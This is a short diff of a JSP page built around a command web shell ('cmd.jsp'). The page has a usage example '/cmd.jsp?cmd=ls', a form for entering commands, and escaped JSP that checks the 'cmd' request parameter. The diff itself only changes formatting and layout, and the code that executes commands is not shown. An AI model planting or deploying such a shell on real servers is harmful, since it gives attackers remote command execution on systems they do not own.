@@ -1,5 +1,5 @@
-<pre>
-example : /cmd.jsp?cmd=ls 
+
+example : /cmd.jsp?cmd=ls  <br><br>
 
 <%@ page import="java.util.*,java.io.*"%>
 <%@ page language="java" contentType="text/html; charset=UTF-8"
@@ -15,6 +15,7 @@ example : /cmd.jsp?cmd=ls
         resize: none;
         border: 1px solid rgb(42, 42, 42);
         width: 100%;
+		height: 80%;
     }
     /* 아래는 기본 래퍼 설정 */
     #wrapper {
@@ -33,7 +34,7 @@ example : /cmd.jsp?cmd=ls
 <input type="text" name="cmd">
 <input type="submit" value="전송">
 </form>
-
+<pre>
 &lt;%
 if (request.getParameter("cmd") != null)
 {
@@ -59,7 +60,7 @@ if (request.getParameter("cmd") != null)
 	}
 }
 %&gt;
+</pre>
 </textarea>
 </body>
 </html>
-</pre>
